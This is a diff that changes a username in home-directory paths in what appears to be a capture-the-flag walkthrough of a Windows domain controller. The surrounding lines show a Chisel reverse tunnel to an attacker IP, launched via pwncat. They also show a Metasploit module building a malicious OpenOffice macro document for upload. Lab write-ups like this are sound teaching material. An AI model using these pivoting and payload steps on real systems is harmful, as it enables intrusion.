@@ -303,7 +303,7 @@ Listen 8083
 We can try to access the internal website by uploading a [Chisel](https://github.com/jpillora/chisel) agent on the host.
 
 ```console
-(local) pwncat$ upload /home/bashee/Tools/Windows/chisel_1.9.1_windows_amd64 c.exe
+(local) pwncat$ upload /home/s3rp3nt/Tools/Windows/chisel_1.9.1_windows_amd64 c.exe
 (remote) tstark@DC:C:\Users\tstark$ .\c.exe client 10.10.14.7:8000 R:8083:127.0.0.1:8083
 
 $ ./chisel_1.9.1_linux_amd64 server --port 8000 --reverse
@@ -399,7 +399,7 @@ msf6 exploit(multi/misc/openoffice_document_macro) > run
 [*] Packaging file: mimetype
 [*] Packaging file: settings.xml
 [*] Packaging file: styles.xml
-[+] msf.odt stored at /home/bashee/.msf4/local/msf.odt
+[+] msf.odt stored at /home/s3rp3nt/.msf4/local/msf.odt
 ```
 
 Next we upload the generated file to the server and wait for the macro to get executed. This may take a minute or two.
